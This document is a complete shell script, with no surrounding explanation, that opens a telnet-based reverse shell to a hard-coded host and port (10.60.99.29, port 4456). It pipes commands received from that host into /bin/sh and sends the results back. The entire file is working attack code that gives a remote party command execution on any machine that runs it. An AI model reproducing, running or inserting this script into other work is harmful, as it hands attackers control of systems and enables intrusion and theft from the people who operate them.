#!/bin/sh
IP="10.60.99.29"
PORT="4456"

/usr/bin/telnet $IP $PORT | /bin/sh | /usr/bin/telnet $IP $PORT
